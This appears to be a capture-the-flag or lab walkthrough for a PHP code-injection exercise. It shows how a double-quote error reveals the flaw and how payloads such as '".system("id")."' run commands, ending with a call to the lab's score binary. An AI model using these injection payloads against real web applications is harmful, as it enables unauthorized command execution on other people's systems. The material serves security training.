**GOAL**: To finish this exercise, you need to run the binary `/usr/local/bin/score UUID`

## Solution
1. Once you visit the website, you can enter `' (single quote)` into the url at the very end and you can see that it has been `url-encoded` by the website
2. You can then try to enter `" (double-quote)`, but this time, the system gives a syntax error.
3.  This error is a very good indication that there might be a possibility of Code Execution
4. We can take use of this misconfiguration and do various things, such as concatenate a string by using `"."` string, the command would be: 
```
name=hacker"."blah
```
5. We can use to get information about the user using the `id` command in the following way:
```
".system("id")."
```
6. We can get information about username using the `uname` command 
```
".system("uname -a")."
```
7. Lastly, we can complete this exercise by enteering the binary provided to us
```
".system("/usr/local/bin/score f11a5d9c-353f-40ae-89d6-75392618a2bd")."
```
